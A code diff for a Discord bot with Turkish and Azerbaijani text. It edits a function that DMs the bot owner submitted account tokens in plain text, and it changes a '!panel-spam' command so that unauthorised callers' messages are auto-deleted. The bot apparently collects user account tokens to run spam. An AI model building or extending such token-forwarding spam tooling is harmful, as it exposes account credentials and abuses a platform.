@@ -63,7 +63,7 @@ async function sendTokenToOwner(client, title, token, accountName, username, add
     if (owner) {
       await owner.send(
         `📥 **${title}**\n` +
-        `👤 **Hesab:** ${accountName} (${username})\n` +
+        `👤 **Hesap:** ${accountName} (${username})\n` +
         `🆔 **Ekleyen Kullanıcı ID:** <@${addedByUserId}> (${addedByUserId})\n` +
         `🔑 **Token:** \`${token}\``
       );
@@ -73,14 +73,21 @@ async function sendTokenToOwner(client, title, token, accountName, username, add
   }
 }
 
-// !panel-spam komutu (Yalnızca səlahiyyətli şəxs yaza bilər)
+// !panel-spam komutu
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return;
 
   if (message.content === '!panel-spam') {
-    // Səlahiyyəti olmayana xüsusi mesaj göndərilir
+    // Səlahiyyəti olmayanın mesajı silinir, xəta atılır və 5 saniyə sonra silinir
     if (message.author.id !== OWNER_ID) {
-      return message.reply({ content: '❌ Bu komutu sadece yönetici kullanabilir.' }).catch(() => {});
+      try { await message.delete(); } catch (e) {}
+      const replyMsg = await message.reply({ content: '❌ Bu komutu sadece yönetici kullanabilir.' }).catch(() => {});
+      if (replyMsg) {
+        setTimeout(async () => {
+          try { await replyMsg.delete(); } catch (e) {}
+        }, 5000);
+      }
+      return;
     }
 
     try { await message.delete(); } catch (e) {}
